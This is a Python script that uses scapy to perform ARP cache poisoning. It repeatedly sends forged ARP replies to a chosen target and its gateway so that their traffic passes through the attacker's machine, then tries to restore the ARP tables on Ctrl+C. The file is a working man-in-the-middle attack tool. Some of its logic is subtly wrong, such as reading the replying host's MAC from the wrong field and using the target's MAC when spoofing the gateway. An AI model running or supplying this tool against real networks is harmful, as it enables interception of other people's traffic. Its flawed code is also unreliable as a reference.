#!/usr/bin/env python
import scapy.all as scapy
import argparse
import time
import sys


def spoof(target_ip, target_mac, spoof_ip ):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwdst

def restore(target_ip, router_ip):
    destinatioin_mac= get_mac(target_ip)
    router_mac = get_mac(router_ip)
    packet = scapy.ARP(op= 2, pdst=target_ip, hwdst=destinatioin_mac, psrc=router_ip, hwsrc=router_mac )
    scapy.send(packet, count=4, verbose=False)


def argument():
    argument = argparse.ArgumentParser()
    #argument.add_argument("-i", "--interface", dest="iface", help="Specify the interface to use")
    argument.add_argument("-t","--target", dest="target",help="Specify the target ip")
    argument.add_argument("-s","--spoof/gateway", dest="spoof", help="Specify the spoofing/local gateway ip")
    option = argument.parse_args()
    return option


option = argument()
target_ip = option.target         #change ip
gateway_ip = option.spoof
if target_ip==None or gateway_ip==None:
    print("[-] Invalid argument.Provide complete argument.")
    sys.exit()

mac = get_mac(target_ip)
try:
    packet_count = 0
    while True:
        spoof(target_ip, mac, gateway_ip)
        spoof(gateway_ip, mac, target_ip)
        packet_count += 2
        print("\rPacket sent ="+ str(packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected ctrl+C , Resetting IP Table, Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

